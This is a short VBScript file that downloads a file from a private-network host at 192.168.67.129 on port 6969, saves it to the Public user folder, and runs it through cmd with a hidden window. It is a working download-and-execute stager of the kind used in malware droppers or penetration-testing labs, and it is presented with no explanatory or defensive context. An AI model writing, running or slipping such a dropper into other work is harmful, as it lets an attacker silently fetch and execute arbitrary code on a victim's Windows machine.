strFileURL = "http://192.168.67.129:6969/test.txt"
strHDLocation = "C:\Users\Public\test.txt"
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", strFileURL, false
objXMLHTTP.send()
 If objXMLHTTP.Status = 200 Then
   Set objADOStream = CreateObject("ADODB.Stream")
   objADOStream.Open
   objADOStream.Type = 1 'adTypeBinary
   objADOStream.Write objXMLHTTP.ResponseBody
   objADOStream.Position = 0    'Set the stream position to the start
   Set objFSO = Createobject("Scripting.FileSystemObject")
     If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
   Set objFSO = Nothing
   objADOStream.SaveToFile strHDLocation
   objADOStream.Close
   Set objADOStream = Nothing
 End if
Set objXMLHTTP = Nothing
cmd = "cmd /c " & strHDLocation
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run cmd,0,true
set objShell = Nothing